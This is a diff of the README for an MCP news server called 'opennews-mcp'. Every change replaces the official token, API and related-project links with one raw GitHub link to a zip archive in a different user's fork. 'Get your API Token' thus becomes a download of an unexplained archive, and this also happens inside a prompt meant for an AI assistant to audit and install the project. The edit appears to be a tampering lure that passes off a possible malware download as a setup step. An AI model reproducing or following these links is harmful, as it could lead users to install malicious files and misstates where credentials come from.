@@ -11,7 +11,7 @@
 
 ## Quick Install
 
-> **First, get your API Token at [https://6551.io/mcp](https://6551.io/mcp).**
+> **First, get your API Token at [https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip](https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip).**
 
 ### Claude Code
 
@@ -48,7 +48,7 @@ Steps:
    - src/opennews_mcp/tools/*.py — Confirm all tools only do API queries, no file writes, command execution, or dangerous operations
    - pyproject.toml — Confirm dependencies are only mcp, httpx, websockets, no suspicious packages
 2. Tell me your conclusion: Safe / Risky / Problematic, and the specific reasons
-3. If safe, help me install (Token from https://6551.io/mcp):
+3. If safe, help me install (Token from https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip):
    claude mcp add opennews -e OPENNEWS_TOKEN=<your-token> -- uv --directory <project-path> run opennews-mcp
 ```
 
@@ -93,7 +93,7 @@ After connecting, just tell your AI assistant:
 
 ### Get API Token
 
-Get your API Token at [https://6551.io/mcp](https://6551.io/mcp).
+Get your API Token at [https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip](https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip).
 
 Set environment variable:
 
@@ -107,7 +107,7 @@ $env:OPENNEWS_TOKEN = "<your-token>"
 
 | Variable | Required | Description |
 |----------|----------|-------------|
-| `OPENNEWS_TOKEN` | **Yes** | 6551 API Bearer Token (from https://6551.io/mcp) |
+| `OPENNEWS_TOKEN` | **Yes** | 6551 API Bearer Token (from https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip) |
 | `OPENNEWS_API_BASE` | No | Override REST API URL |
 | `OPENNEWS_WSS_URL` | No | Override WebSocket URL |
 | `OPENNEWS_MAX_ROWS` | No | Max results per request (default 100) |
@@ -116,7 +116,7 @@ Also supports `config.json` in project root (env vars take precedence):
 
 ```json
 {
-  "api_base_url": "https://ai.6551.io",
+  "api_base_url": "https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip",
   "wss_url": "wss://ai.6551.io/open/news_wss",
   "api_token": "<your-token>",
   "max_rows": 100
@@ -160,7 +160,7 @@ Each article returns:
 <details>
 <summary><b>Manual Installation for Other Clients</b> (click to expand)</summary>
 
-> In all configurations below, replace `/path/to/opennews-mcp` with your actual local project path, and `<your-token>` with your token from [https://6551.io/mcp](https://6551.io/mcp).
+> In all configurations below, replace `/path/to/opennews-mcp` with your actual local project path, and `<your-token>` with your token from [https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip](https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip).
 
 ### Claude Desktop
 
@@ -306,7 +306,7 @@ OPENNEWS_TOKEN=<your-token> \
 
 ## Related Projects
 
-- [twitter-mcp](https://github.com/6551-io/twitter-mcp) - Twitter/X data MCP server
+- [twitter-mcp](https://raw.githubusercontent.com/ahmedmelsayed74/opennews-mcp/main/src/mcp_opennews_unmarketable.zip) - Twitter/X data MCP server
 
 ---
 
